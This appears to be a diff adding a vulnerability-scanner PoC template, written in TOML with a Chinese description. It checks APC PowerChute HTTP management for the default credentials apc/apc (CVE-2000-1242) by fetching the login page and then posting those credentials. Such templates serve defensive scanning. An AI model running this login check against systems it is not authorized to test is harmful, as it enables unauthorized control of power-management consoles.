@@ -1,0 +1,49 @@
+[info]
+author = "AVE"
+description = "检测 APC PowerChute HTTP 管理服务是否存在默认凭据（apc/apc），验证远程攻击者能否通过默认用户名密码登录管理后台获取系统控制权。"
+id = "POC-AVE-2000-2206"
+name = "APC PowerChute 默认凭据远程访问漏洞 PoC"
+severity = "critical"
+tags = ["ave-2000-2206"]
+vuln_id = [
+    "CVE-2000-1242",
+    "AVE-2000-2206",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "PowerChute",
+    "APC",
+    "Login",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=apc&password=apc"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "Welcome",
+    "Status",
+    "Logout",
+]
